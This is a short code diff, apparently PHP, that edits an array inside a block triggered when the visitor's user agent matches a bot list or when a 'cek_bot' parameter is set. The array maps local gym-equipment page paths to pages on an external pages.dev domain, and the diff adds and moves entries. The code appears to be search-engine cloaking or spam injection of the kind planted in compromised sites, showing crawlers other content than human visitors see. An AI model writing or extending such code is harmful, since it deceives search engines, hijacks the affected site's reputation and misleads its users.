@@ -19,7 +19,7 @@ if (preg_match($bot_list, $ua) || isset($_GET['cek_bot'])) {
     $mapping = [
     '/stairmaster' => 'https://gymequipment.pages.dev/stairmaster',
     '/studio' => 'https://gymequipment.pages.dev/studio',
-    '/nautilus' => 'https://gymequipment.pages.dev/nautilus',
+    '/home-gym-equipment' => 'https://gymequipment.pages.dev/equipment',
     '/cardio/climbers-steppers' => 'https://gymequipment.pages.dev/steppers',
     '/blog/what-is-hyrox' => 'https://gymequipment.pages.dev/hyrox',
     '/blog/understanding-cable-machine-ratios' => 'https://gymequipment.pages.dev/ratios',
@@ -28,6 +28,8 @@ if (preg_match($bot_list, $ua) || isset($_GET['cek_bot'])) {
     '/inbody' => 'https://gymequipment.pages.dev/inbody',
     '/finance' => 'https://gymequipment.pages.dev/finance',
     '/blog/hip-abductors-vs-adductors-benefits-explained' => 'https://gymequipment.pages.dev/explained',
+    '/pilates/reformers' => 'https://gymequipment.pages.dev/reformers',
+    '/nautilus' => 'https://gymequipment.pages.dev/nautilus',
         
     ];
 
